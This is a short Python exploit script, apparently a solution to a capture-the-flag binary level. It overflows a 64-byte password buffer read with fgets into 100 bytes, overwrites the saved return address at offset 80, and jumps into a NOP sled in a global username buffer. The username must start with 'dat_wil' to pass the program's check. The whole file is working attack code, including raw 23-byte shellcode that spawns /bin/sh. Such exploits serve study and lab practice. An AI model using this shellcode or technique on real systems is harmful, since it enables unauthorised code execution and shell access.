#!/usr/bin/env python3
import struct
import sys

# Vulnerability: Password buffer overflow
# s[64] at [esp+0x1c] can be overflowed with fgets(s, 100, stdin)
#
# GDB analysis shows:
# - Password buffer at esp+0x1c
# - Saved EIP at offset 80 from password buffer start
# - Confirmed with pattern: crashed at 0x55555555 (UUUU at offset 80)
#
# Exploit strategy:
# 1. Put shellcode in username buffer (a_user_name at 0x0804a040)
# 2. Overflow password buffer to overwrite return address
# 3. Point return address to shellcode in username buffer

# Shellcode to spawn /bin/sh (23 bytes)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# a_user_name buffer is at 0x0804a040 (global, 100 bytes, NX disabled)
# Username: Must start with "dat_wil" to pass verification, then NOP sled + shellcode
username = b"dat_wil" + b"\x90" * 60 + shellcode + b"\n"

# Password: padding (80 bytes) + return address
padding = b"A" * 80
# Jump to middle of NOP sled (0x0804a040 + 7 bytes for "dat_wil\n" + 30 bytes into NOPs)
ret_addr = struct.pack("<I", 0x0804a040 + 40)

password = padding + ret_addr + b"\n"

# Output for piping to the program
sys.stdout.buffer.write(username)
sys.stdout.buffer.write(password)

